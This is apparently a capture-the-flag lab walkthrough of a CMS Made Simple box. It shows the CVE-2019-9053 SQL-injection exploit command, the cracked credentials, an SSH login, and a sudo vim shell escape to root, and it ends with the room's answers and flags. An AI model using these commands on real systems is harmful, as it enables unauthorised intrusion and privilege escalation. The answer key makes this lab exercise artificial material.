```
after nmap scan i just realize theres a cms in `/simple` and after scroll a bit:
```
Â© Copyright 2004 - 2021 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```
and in `searchsploit` i found theres a `sqli` and i just download the exploit ...

Command:
```bash
python2.7 sq1i.py -u http://10.10.160.249/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```


### Tasks

- How many services are running under port 1000?
```
3
```

- What is running on the higher port?
```
ssh
```

- What's the CVE you're using against the application?
```
CVE-2019-9053
```

- To what kind of vulnerability is the application vulnerable?
```
sqli
```

## SQL Injection

after finding the vulnerability against the application we can now exploit it...

so we download the python2 exploit and then we can start after running exploit
with seclists `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`and the

Command:
```bash
python2 sq1i.py -u http://10.10.31.164/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```

we found these creds:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

### Tasks

- What's the password?
```
secret
```

- Where can you login with the details obtained?
```
ssh
```

## SSH

we logged in as `mitch:secret` and we found out theres a `user.txt` on home directory

### Tasks

- What's the user flag?
```
G00d j0b, keep up!
```

- Is there any other user in the home directory? What's its name?
```
sunbatch
```

## Privilege escalation

the easiest way to Privilege escalation is running the linpeas ...

after setup a python http server and get the shell script with `wget`
we can now run it.

**oHHHH yes we can run vim as root without password**
so we can use `GTFOBins` to find the way :
```bash
vim -c ':!/bin/sh'
```
so we got root shell we can now read `/root/root.txt`

### Tasks

- What can you leverage to spawn a privileged shell?
```
vim
```

- What's the root flag?
```
W3ll d0n3. You made it!
```
